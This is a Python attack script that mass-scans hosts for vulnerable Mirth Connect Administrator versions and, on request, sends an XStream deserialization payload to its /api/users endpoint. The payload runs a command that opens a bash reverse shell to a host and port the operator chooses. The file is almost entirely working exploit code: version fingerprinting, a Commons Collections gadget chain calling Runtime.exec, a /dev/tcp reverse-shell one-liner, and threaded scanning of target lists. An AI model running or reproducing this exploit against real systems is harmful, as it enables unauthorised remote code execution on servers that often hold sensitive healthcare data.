from colorama import Fore
import concurrent.futures
import requests
import argparse

requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

parser = argparse.ArgumentParser()
group = parser.add_mutually_exclusive_group()

parser.add_argument('-t', '--target',
                   help="Target to scan",)

parser.add_argument('-f', '--file',
                   help="File to scan",)

group.add_argument('-p', '--port',
                   help="port to scan")

parser.add_argument('-e', '--exploit', action='store_true',
                   help="exploit target")

parser.add_argument('-lh', '--localhost',
                   help="localhost ip")

parser.add_argument('-lp', '--localport',
                   help="local port")


banner = fr"""

{Fore.CYAN}
   _____  .__         __  .__      __________      _________  
  /     \ |__|_______/  |_|  |__   \______   \____ \_   ___ \ 
 /  \ /  \|  \_  __ \   __\  |  \   |     ___/  _ \/    \  \/ 
/    Y    \  ||  | \/|  | |   Y  \  |    |  (  <_> )     \____
\____|__  /__||__|   |__| |___|  /  |____|   \____/ \______  /
        \/                     \/                          \/ 

{Fore.WHITE}Author: {Fore.CYAN}c0deninja


{Fore.RESET}

"""

print(banner)

args = parser.parse_args()

user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"

header = {
    "User-Agent": user_agent,
    "X-Requested-With": "OpenAPI",
    "Content-Type": "application/xml"
}

vulnerable_versions = ["4.1.1", "4.3.0", "4.4.0", "4.2.0", "3.8.1", "3.2.1", "3.8.0", "3.1", "3.5.1"]
get_version = '/api/server/version'

def exploit_payload(command: str) -> str:

    command = command.replace("&", "&amp;")
    command = command.replace("<", "&lt;")
    command = command.replace(">", "&gt;")
    command = command.replace('"', "&quot;")
    command = command.replace("'", "&apos;")

    PAYLOAD = f"""<sorted-set>
    <string>abcd</string>
    <dynamic-proxy>
        <interface>java.lang.Comparable</interface>
        <handler class="org.apache.commons.lang3.event.EventUtils$EventBindingInvocationHandler">
        <target class="org.apache.commons.collections4.functors.ChainedTransformer">
            <iTransformers>
            <org.apache.commons.collections4.functors.ConstantTransformer>
                <iConstant class="java-class">java.lang.Runtime</iConstant>
            </org.apache.commons.collections4.functors.ConstantTransformer>
            <org.apache.commons.collections4.functors.InvokerTransformer>
                <iMethodName>getMethod</iMethodName>
                <iParamTypes>
                <java-class>java.lang.String</java-class>
                <java-class>[Ljava.lang.Class;</java-class>
                </iParamTypes>
                <iArgs>
                <string>getRuntime</string>
                <java-class-array/>
                </iArgs>
            </org.apache.commons.collections4.functors.InvokerTransformer>
            <org.apache.commons.collections4.functors.InvokerTransformer>
                <iMethodName>invoke</iMethodName>
                <iParamTypes>
                <java-class>java.lang.Object</java-class>
                <java-class>[Ljava.lang.Object;</java-class>
                </iParamTypes>
                <iArgs>
                <null/>
                <object-array/>
                </iArgs>
            </org.apache.commons.collections4.functors.InvokerTransformer>
            <org.apache.commons.collections4.functors.InvokerTransformer>
                <iMethodName>exec</iMethodName>
                <iParamTypes>
                <java-class>java.lang.String</java-class>
                </iParamTypes>
                <iArgs>
                <string>{command}</string>
                </iArgs>
            </org.apache.commons.collections4.functors.InvokerTransformer>
            </iTransformers>
        </target>
        <methodName>transform</methodName>
        <eventTypes>
            <string>compareTo</string>
        </eventTypes>
        </handler>
    </dynamic-proxy>
    </sorted-set>
    """
    return PAYLOAD

def find_version(response_text: str) -> str:
    for versions in vulnerable_versions:
        if versions in response_text:
            return versions
    return None

def check_mirthtext(domain: str, port: str) -> str:
    r = requests.get(domain, verify=False, headers=header, timeout=10)
    if "Mirth Connect Administrator" in r.text:
        return True
    else:
        return False

def check_vulnerability(domain: str, port:str) -> str:
    try:
        if port == "443":
            domain = f"https://{domain}"
        else:
            domain = f"http://{domain}:{port}"
        r = requests.get(domain + get_version, verify=False, headers=header, timeout=10)
        vuln_version = find_version(r.text)
        mirth_connect_admin = check_mirthtext(domain, port)
        if mirth_connect_admin:
            if vuln_version in vulnerable_versions:
                print(f"{Fore.GREEN}[+] {Fore.WHITE}Found Mirth Connect Administrator: {Fore.CYAN} {domain}{Fore.MAGENTA} {vuln_version}{Fore.RESET}\n")
                return True
            else:
                print(f"{Fore.RED}[-] {domain}: {Fore.WHITE}Mirth Connect Administrator: Not Vulnerable!\n")
                return False
    except requests.exceptions.ConnectTimeout:
        pass
    except requests.exceptions.ConnectionError:
        pass


def scan_target(target, port):
    try:
        vulnerability = check_vulnerability(target, port)
        if vulnerability and args.exploit:
            exploit(target, port)
    except Exception as e:
        print(f"{Fore.RED}[-] Error scanning {target}:{port} - {e}")

def exploit(target, port):
    command = f"sh -c $@|sh . echo bash -c '0<&53-;exec 53<>/dev/tcp/{args.localhost}/{args.localport};sh <&53 >&53 2>&53'"
    data = exploit_payload(command)
    print(f"Exploit launched......n")
    url = f"https://{target}/api/users" if port == "443" else f"http://{target}:{port}/api/users"
    try:
        r = requests.post(url, data=data, verify=False, headers=header, timeout=10)
        print(f"Check your reverse shell at {Fore.MAGENTA}{args.localhost} {Fore.CYAN}{args.localport}\n")
    except Exception as e:
        print(f"{Fore.RED}[-] Error exploiting {target}:{port} - {e}")

if __name__ == "__main__":

    if args.target:
        if args.port:
            scan_target(args.target, args.port)

    if args.file:
        if args.port:
            with open(args.file, "r") as f:
                targets = [x.strip() for x in f.readlines()]
                with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
                    futures = [executor.submit(scan_target, target, args.port) for target in targets]
                    for future in concurrent.futures.as_completed(futures):
                        try:
                            future.result()
                        except Exception as e:
                            print(f"{Fore.RED}[-] Error: {e}")
